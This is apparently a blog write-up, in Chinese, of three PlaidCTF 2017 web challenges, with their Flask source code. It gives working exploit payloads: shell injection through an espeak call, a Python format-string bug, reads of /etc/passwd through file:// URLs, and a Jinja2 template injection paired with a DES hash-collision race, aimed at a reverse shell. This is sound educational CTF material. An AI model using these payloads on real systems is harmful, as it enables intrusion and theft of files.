---
title: PlaidCTF 2017 web writeup
date: 2017-05-12 14:42:48
tags:
- ctf
- flask
- 格式化字符串
- 模板注入
---


原文我首发在freebuff上
[http://www.freebuf.com/articles/web/133336.html](http://www.freebuf.com/articles/web/133336.html)

稍微整理下pctf2017的web writeup，各种假web题，有心的人一定能感受到这些年国外的ctf对于web题目的态度

只可惜有道很有趣的游戏题完全无从下手，也找不到相关的wp，很可惜

<!--more-->


# echo #

上来时flask的代码审计

```
from flask import render_template, flash, redirect, request, send_from_directory, url_for
import uuid
import os
import subprocess
import random

cwd = os.getcwd()
tmp_path = "/tmp/echo/"
serve_dir = "audio/"
docker_cmd = "docker run -m=100M --cpu-period=100000 --cpu-quota=40000 --network=none -v {path}:/share lumjjb/echo_container:latest python run.py"
convert_cmd = "ffmpeg -i {in_path} -codec:a libmp3lame -qscale:a 2 {out_path}"

MAX_TWEETS = 4
MAX_TWEET_LEN = 140


from flask import Flask
app = Flask(__name__)
flag = "PCTF{XXXXXXX...XXXXXXXX}"

if not os.path.exists(tmp_path):
    os.makedirs(tmp_path)


def process_flag (outfile):
    with open(outfile,'w') as f:
        for x in flag:
            c = 0
            towrite = ''
            for i in range(65000 - 1):
                k = random.randint(0,127)
                c = c ^ k
                towrite += chr(k)

            f.write(towrite + chr(c ^ ord(x)))
    return

def process_audio (path, prefix, n):
    target_path = serve_dir + prefix
    if not os.path.exists(target_path):
        os.makedirs(target_path)

    for i in range(n):
        st = os.stat(path + str(i+1) + ".wav")
        if st.st_size < 5242880:
            subprocess.call (convert_cmd.format(in_path=path + str(i+1) + ".wav",
                                            out_path=target_path + str(i+1) + ".wav").split())


@app.route('/audio/<path:path>')
def static_file(path):
    return send_from_directory('audio', path)

@app.route("/listen",methods=['GET', 'POST'])
def listen_tweets():
    n = int(request.args['n'])
    my_uuid = request.args['my_uuid']

    if n > MAX_TWEETS:
        return "ERR: More than MAX_TWEETS"

    afiles = [my_uuid + "/" + str(i+1) + ".wav" for i in range(n)]
    return render_template('listen.html', afiles = afiles)

@app.route("/",methods=['GET', 'POST'])
def read_tweets():
    t1 = request.args.get('tweet_1')
    if t1:
        tweets = []
        for i in range(MAX_TWEETS):
            t = request.args.get('tweet_' + str(i+1))
            if len(t) > MAX_TWEET_LEN:
                return "ERR: Violation of max tween length"

            if not t:
                break
            tweets.append(t)

        my_uuid = uuid.uuid4().hex
        my_path = tmp_path + my_uuid + "/"

        if not os.path.exists(my_path):
                os.makedirs(my_path)

        with open(my_path + "input" ,"w") as f:
            f.write('\n'.join(tweets))

        process_flag(my_path + "flag")

        out_path = my_path + "out/"
        if not os.path.exists(out_path):
            os.makedirs(out_path)

        subprocess.call(docker_cmd.format(path=my_path).split())
        process_audio(out_path, my_uuid + '/', len(tweets))

        return redirect(url_for('.listen_tweets', my_uuid=my_uuid, n=len(tweets)))

    else:
        return render_template('form.html')

if __name__ == "__main__":
    app.run(threaded=True)
```

通读整个代码，最开始可能都会把目光放到ffmpeg上来，事实上，整个站的功能几乎都是围绕音频的，这里也不存在以前的那个cve，而ffmpeg的作用后面再提

这里的关键信息是
```
docker_cmd = "docker run -m=100M --cpu-period=100000 --cpu-quota=40000 --network=none -v {path}:/share lumjjb/echo_container:latest python run.py"
```

这里的docker其实是可以下载到的，pull下来，看看run.py

```
import sys
from subprocess import call

import signal
import os
def handler(signum, frame):
    os._exit(-1)

signal.signal(signal.SIGALRM, handler)
signal.alarm(30)


INPUT_FILE="/share/input"
OUTPUT_PATH="/share/out/"

def just_saying (fname):
    with open(fname) as f:
        lines = f.readlines()
        i=0
        for l in lines:
            i += 1

            if i == 5:
                break

            l = l.strip()

            # Do TTS into mp3 file into output path
            call(["sh","-c",
                "espeak " + " -w " + OUTPUT_PATH + str(i) + ".wav \"" + l + "\""])



def main():
    just_saying(INPUT_FILE)

if __name__ == "__main__":
    main()
```

![image_1becp0s2th7n1iamvhh17tj14j29.png-16kB][1]

主要问题在于这里，我们可以通过闭合引号，来执行任意命令。

我们重新看看题目的流程

我们输入字符串->tweets->闭合字符串执行命令->返回判断大小->判断通过经过ffmpeg转化->获取返回音频。


也就是说，我们首先无法获得flag文件的内容，因为太长了，其次我们不能直接获取返回，因为ffmpeg会转化内容为wav，如果输入不是wav，那么就会失败。

最后，我们想了办法通过写入python代码，解flag为正确flag，然后通过espeak获取返回音频。

```
";printf "f=open('/share/flag')\ns=''\nwhile 1:\t\n\tc=0 \n\tfor j in range(65000):\n">/share/b.py;"

";printf "\t\th=f.read(1)\n\t\tif h!='':\n\t\t\tc^=ord(h)\n\t\telse:\n\t\t\tprint len(s)\n\t\t\texit()\n\ts+=chr(c)">>/share/b.py;"

";espeak -w /share/out/1.wav $(python /share/b.py);"
```

```
PCTF{L15st3n_T0__reee_reeeeee_reee_la}
```

# Pykemon #

仍然是flask的代码审计

```
from random import randint
import json


class Pykemon(object):
    pykemon = [
            [100, 'Pydiot', 'Pydiot','images/pydiot.png', 'Pydiot is an avian Pykamon with large wings, sharp talons, and a short, hooked beak'], 
            [90, 'Pytata', 'Pytata', 'images/pytata.png', 'Pytata is cautious in the extreme. Even while it is asleep, it constantly listens by moving its ears around.'],
            [80, 'Pyliwag', 'Pyliwag', 'images/pyliwag.png', 'Pyliwag resembles a blue, spherical tadpole. It has large eyes and pink lips.'],
            [70, 'Pyrasect', 'Pyrasect', 'images/pyrasect.png','Pyrasect is known to infest large trees en masse and drain nutrients from the lower trunk and roots.'],
            [60, 'Pyduck', 'Pyduck', 'images/pyduck.png','Pyduck is a yellow Pykamon that resembles a duck or bipedal platypus'],
            [50, 'Pygglipuff', 'Pygglipuff', 'images/pygglipuff.png','When this Pykamon sings, it never pauses to breathe.'],
            [40, 'Pykachu', 'Pykachu', 'images/pykachu.png','This Pykamon has electricity-storing pouches on its cheeks. These appear to become electrically charged during the night while Pykachu sleeps.'],
            [30, 'Pyrigon', 'Pyrigon', 'images/pyrigon.png','Pyrigon is capable of reverting itself entirely back to program data and entering cyberspace.'],
            [20, 'Pyrodactyl', 'Pyrodactyl', 'images/pyrodactyl.png','Pyrodactyl is a Pykamon from the age of dinosaurs'],
            [10, 'Pytwo', 'Pytwo', 'images/pytwo.png','Pytwo is a Pykamon created by genetic manipulation'],
            [0, 'FLAG', 'FLAG','images/flag.png', 'PCTF{XXXXX}']
            ]


    def __init__(self, name=None, hp=None):
        pykemon = Pykemon.pykemon
        if not name:              
            i = randint(0,10)
        else:
            count = 0
            for p in pykemon:
                if name in p:
                    i = count
                count += 1
        
        self.name = pykemon[i][2]
        self.nickname = pykemon[i][3]
        self.sprite = pykemon[i][4]
        self.description = pykemon[i][5]
        self.hp = hp
        if not hp:
            self.hp = randint(1,100)
        self.rarity = pykemon[i][0]
        self.pid = self.name + str(self.hp)
        

class Room(object):
    def __init__(self):
        self.rid = 0
        self.pykemon_count = randint(5,15)
        self.pykemon = []
        
        if not self.pykemon_count:
            return 
        while len(self.pykemon) < self.pykemon_count:
            p = Pykemon()
            self.pykemon.append(p.__dict__)
        return 

class Map(object):
    def __init__(self):
        self.size = 10
```

flag是和其他的宠物小精灵在一个列表里，但是本身调用不到。

```
from flask import Flask, request, session, render_template, render_template_string
from random import randint
from pykemon import *
import json
import os
import re


app = Flask(__name__, static_url_path="", static_folder="static")
app.secret_key = 'XXXXXXXXX'


class PageTemplate(object):
    def __init__(self, template):
        self.template = template

@app.route('/')
def index():
    r = Room()
    balls = 10
    session['room'] = r.__dict__ 
    session['caught'] = {'pykemon': list()}
    session['balls'] = balls
    for pykemon in r.pykemon:
        print pykemon

    print session['caught']
    return render_template('index.html', pykemon=r.pykemon, balls=balls)
    

@app.route('/catch/', methods=['POST'])
def pcatch():
    name = request.form['name']
    if not name:
        return 'Error'
    
    balls = session.get('balls')
    balls -= 1
    if balls < 0:
        return "GAME OVER"
    
    session['balls'] = balls
    p = check(name, 'room')
    
    if not p:
        return "Error: trying to catch a pykemon that doesn't exist"
    
    r = session.get('room')
    for pykemon in r['pykemon']:
        if pykemon['pid'] == name:
            r['pykemon'].remove(pykemon)
            print pykemon, r['pykemon']
    
    session['room'] = r

    s = session.get('caught')
    
    if p.rarity > 90:
        s['pykemon'].append(p.__dict__)
        session['caught'] = s
        if r['pykemon']:
            return p.name + ' has been caught!' + str(balls)
        else:
            return p.name + ' has been caught!' + str(balls) + '!GAME OVER!'
    
    elif p.rarity > 0:
        chance = (randint(1,90) + p.rarity) / 100
        if chance > 0:
            s['pykemon'].append(p.__dict__)
            session['caught'] = s
            if r['pykemon']:
                return p.name + ' has been caught!' + str(balls)
            else:
                return p.name + ' has been caught!' + str(balls) + '!GAME OVER!'
    if r['pykemon']:
        return p.name + ' got away!'+ str(balls)
    else:
        return p.name + ' got away!'+ str(balls) + '!GAME OVER!'

@app.route('/rename/', methods=['POST'])
def rename():
    name = request.form['name']
    new_name = request.form['new_name']
    if not name:
        return 'Error'

    p = check(name, 'caught')
    if not p:
        return "Error: trying to name a pykemon you haven't caught!"
    
    r = session.get('room')   
    s = session.get('caught')
    for pykemon in s['pykemon']:
        if pykemon['pid'] == name:
            pykemon['nickname'] = new_name
            session['caught'] = s
            print session['caught']
            return "Successfully renamed to:\n" + new_name.format(p)
    
    return "Error: something went wrong"

def check(name, prop):
    s = session.get(prop)
    if 'pykemon' in s.keys():
        for pykemon in s['pykemon']:
            if pykemon['pid'] == name:
                return Pykemon(pykemon['name'], pykemon['hp'])
    return None

@app.route('/buy/', methods=['POST'])
def buy():
    balls = session.get('balls') + 1
    if balls < 0:
        return "GAME OVER"

    session['balls'] = balls
    return str(balls)

@app.route('/caught/', methods=['POST'])
def caught():
    pykemons = session.get('caught')
    print pykemons
    if len(pykemons['pykemon']):
        result = "<ul>"
        for p in pykemons['pykemon']:
            result += "<img src="+p['sprite']+" width=32px height=32px><strong>"+p['nickname']+"</strong>: "+p['description']+"<br/>"
        result += "</ul>"
        return result
    return "You have not caught any Pykemons"


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
```

代码中有个关键的地方

![image_1bed3lqm8b1q1vjc1bl067huo1m.png-96kB][6]

python的格式化字符串漏洞，漏洞就不多说了

[https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)

![image_1bed3qtjt1udd6pf1omd6d21osv13.png-36kB][7]


![image_1bed3r714do31nbp129fgce19je1g.png-37.7kB][8]


# SHA-4 #

分享一份国外的wp
[https://pequalsnp-team.github.io/writeups/SHA4](https://pequalsnp-team.github.io/writeups/SHA4)

```
Web - 300 Points

I heard SHA-1 is broken, so I think it’s probably time we move to SHA-4.
```

首先我们能发现最下面有个请求url的功能，存在本地文件包含漏洞，可以读取本地的任何。
```
url=file:///etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
ntp:x:111:115::/home/ntp:/bin/false
ubuntu:x:1000:1000::/home/ubuntu:
```

关于linux信息泄露的问题我就不多聊了

稍微试试发现可以读到apache的配置

```
url=file:///etc/apache2/sites-enabled/000-default.conf

<VirtualHost *:80>
	ServerName sha4

	WSGIDaemonProcess sha4 user=www-data group=www-data threads=8 request-timeout=10
	WSGIScriptAlias / /var/www/sha4/sha4.wsgi

	<directory /var/www/sha4>
		WSGIProcessGroup sha4
		WSGIApplicationGroup %{GLOBAL}
		WSGIScriptReloading On
		Order deny,allow
		Allow from all
	</directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

找到了web目录`/var/www/sha4/`

读到server.py和sha4.py

```
sha4.py


from Crypto.Cipher import DES
import struct
import string

def seven_to_eight(x):
  [val] = struct.unpack("Q", x+"\x00")
  out = 0
  mask = 0b1111111
  for shift in xrange(8):
    out |= (val & (mask<<(7*shift)))<<shift
  return struct.pack("Q", out)

def unpad(x):
  #split up into 7 byte chunks
  length = struct.pack("Q", len(x))
  sevens = [x[i:i+7].ljust(7, "\x00") for i in xrange(0,len(x),7)]
  sevens.append(length[:7])
  return map(seven_to_eight, sevens)

def hash(x):
  h0 = "SHA4_IS_"
  h1 = "DA_BEST!"
  keys = unpad(x)
  for key in keys:
    h0 = DES.new(key).encrypt(h0)
    h1 = DES.new(key).encrypt(h1)
  return h0+h1


```

```
server.py

from flask import Flask, render_template, request, render_template_string
from pyasn1.codec.ber.decoder import decode
from pyasn1.type.univ import OctetString
from urllib2 import urlopen
from sha4 import hash
import string

app = Flask(__name__)
bad     = """<h2>yo that comment was bad, we couldn't parse it</h2>"""
unsafe  = """<h2>that comment decoded to some weird junk</h2>"""
comment = """<h2>Thank you for your SHA-4 feedback. Your comment, %s, is very important to us</h2>"""

def is_unsafe(s):
  for c in s:
    if c not in (string.ascii_letters + string.digits + " ,.:()?!-_'+=[]\t\n<>"):
      return True
  return False

@app.route("/")
def index():
  return render_template("index.html")

@app.route("/comments", methods=['POST'])
def comments():
  try:
    encoded = request.form['comment']
    encoded.replace("\n","\r")
    ber = encoded.decode("hex")
  except TypeError:
    return render_template_string(bad)
  f = "/var/tmp/comments/%s.txt"%hash(ber).encode("hex")
  
  out_text = str(decode(ber))
  open(f, "w").write(out_text)

  if is_unsafe(out_text):
    return render_template_string(unsafe)

  commentt = comment % open(f).read()
  return render_template_string(commentt, comment=out_text.replace("\n","<br/>"))

@app.route("/upload", methods=['POST'])
def upload():
  try:
    comment = urlopen(request.form['url']).read(1024*1024)
    open("/var/tmp/comments/%s.file"%hash(comment).encode("hex"), "w").write(comment)
    return comment
  except:
    return render_template_string(bad)

if __name__ == "__main__":
  app.run()
```

核心代码是下面这部分
```
try:
  encoded = request.form['comment']
  encoded.replace("\n","\r")
  ber = encoded.decode("hex")
except TypeError:
  return render_template_string(bad)
f = "/var/tmp/comments/%s.txt"%hash(ber).encode("hex")
  
out_text = str(decode(ber))
open(f, "w").write(out_text)

if is_unsafe(out_text):
  return render_template_string(unsafe)

commentt = comment % open(f).read()
return render_template_string(commentt, comment=out_text.replace("\n","<br/>"))
```

上面的代码主要做了下面几步

- 对post进来的数据解hex
- 对输入做sha4计算
- 把输出作为文件名输入到`/bar/tmp/comments/<hash>.file`
- 解输入，将结果写入文件
- 判断有没有不安全的字符
- 判断通过加载模板


纵观上面的流程，如果我们先把一个python的反弹shell写入comments下的某个文件内，然后利用模板注入注入
```
{{ config.from_pyfile('/var/tmp/comments/<hash>.file') }}
```
就可以执行任意命令，但这就意味着会包含符
号，无法通过unsafe函数。

上面的具体可以看这篇文章
[https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)


![image_1bekqkggrhpa1od1101o18s29g19.png-49.4kB][9]

从代码里很容易发现一个问题，为什么out_text变量中本来就有内容了，在判断之后，还要从文件中读取呢，这一定是为了漏洞可解而故意的。

但如果我们可以在判断is_unsafe成功后，通过竞争写入新的内容，就可以成功的构造模板注入了。

那么如果想要条件成立，我们需要有两个输入不相同，但是hash相同的输入。

我们关注下hash函数
```
def hash(x):
  h0 = "SHA4_IS_"
  h1 = "DA_BEST!"
  keys = unpad(x)
  for key in keys:
    h0 = DES.new(key).encrypt(h0)
    h1 = DES.new(key).encrypt(h1)
  return h0+h1
```

这里upad会把7个8bit bytes转化为8个7bit byte。

而DES本身的加密方式并不适用所有64位，它忽略每个字节的lsb，这就意味我们可以通过一些方式来找到2个相同hash的payload


只需要碰撞出我们需要的3个被禁止的符号就够了
```
{}/
```

payload
```
def char_position_collision(char):
    for j in xrange(7):
        m1 = "a"*j + char
        for i in xrange(0,256):
            m2 = "a"*j+chr(i)
            if m1 != m2 and hash(m1) == hash(m2):
                print(m1,m2)
                break
char_position_collision("{")
char_position_collision("}")
char_position_collision("/")
```

贴上完整的计算payload
```
from sha4 import hash
from pyasn1.codec.ber.encoder import encode
from pyasn1.codec.ber.decoder import decode
from pyasn1.type.univ import OctetString

n = 2 # number of extra char added by ASN.1 at the start
content = "a{{config.from_pyfile( \"../../tmp/comments/dd31b4dc454c6ec7e01476e02f8eeac4.file\") }}aaaa"

# character to replace at their position for collision
replace = {
 '{':'z;[ks\x7fy',
 '}':'|=]muy\x7f',
 '/':".o\x0f?'+-"
}

sevens = [content[i:i+7].ljust(7, "\x00") for i in xrange(0,len(content),7)]
string = ""
for s in sevens:
    for i in xrange(len(s)):
        c = s[i]
        if c in replace:
            string += replace[c][(i+n)%7]
        else:
            string += c

#MEGA FIX
string = string[:-n]

print(repr(content))
print(repr(string))
#'a{{config.from_pyfile( "../../tmp/comments/dd31b4dc454c6ec7e01476e02f8eeac4.file") }}aaaa'
#'aksconfig.from_pyfile( ".....?tmp.comments\x0fdd31b4dc454c6ec7e01476e02f8eeac4.file") =]aaaa'

asnc = encode(OctetString(content))
asns = encode(OctetString(string))

# (OctetString(tagSet=TagSet((), Tag(tagClass=0, tagFormat=0, tagId=4)), hexValue='616b73636f6e6669672e66726f6d5f707966696c652820222e2e2e2e2e3f746d702e636f6d6d656e74730f64643331623464633435346336656337653031343736653032663865656163342e66696c652229203d5d61616161'), '')
# (OctetString('a{{config.from_pyfile( "../../tmp/comments/dd31b4dc454c6ec7e01476e02f8eeac4.file") }}aaaa', tagSet=TagSet((), Tag(tagClass=0, tagFormat=0, tagId=4))), '')


assert(hash(asnc) == hash(asns))
print("YUP")
```

我们找到了2个payload，
```
0459617b7b636f6e6669672e66726f6d5f707966696c652820222e2e2f2e2e2f746d702f636f6d6d656e74732f64643331623464633435346336656337653031343736653032663865656163342e66696c652229207d7d61616161

0459616b73636f6e6669672e66726f6d5f707966696c652820222e2e2e2e2e3f746d702e636f6d6d656e74730f64643331623464633435346336656337653031343736653032663865656163342e66696c652229203d5d61616161
```

剩下的就是循环请求，等待shell反弹了



  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/jekzbquobb0zziitv0gt568x/image_1becp0s2th7n1iamvhh17tj14j29.png
  [6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/wr6jfjv81aeon3g66qsvex46/image_1bed3lqm8b1q1vjc1bl067huo1m.png
  [7]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/1c292179erl1j5lhmllfjnpi/image_1bed3qtjt1udd6pf1omd6d21osv13.png
  [8]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/1roaz4i7aa33b39mqn3i42e7/image_1bed3r714do31nbp129fgce19je1g.png
  [9]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/mb2ls3dqc8wnqboawn0fiswm/image_1bekqkggrhpa1od1101o18s29g19.png